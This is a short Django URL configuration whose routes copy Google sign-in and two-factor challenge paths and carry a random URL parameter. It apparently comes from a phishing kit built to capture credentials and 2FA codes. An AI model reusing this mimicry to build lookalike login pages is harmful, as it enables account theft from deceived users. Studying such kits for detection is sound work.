from django.urls import path, re_path
from . import views

urlpatterns = [
    path("", views.index, name="index"),
    re_path(r'^oauth2/v2/auth/identifier_id=(?P<random_url>[-\w]+)/$', views.login, name='login'),
    re_path(r"^signin/v2/challenge/dp-TL=&CheckConnection=(?P<random_url>[-\w]+)/$", views.v2sign, name='2-factor')
]
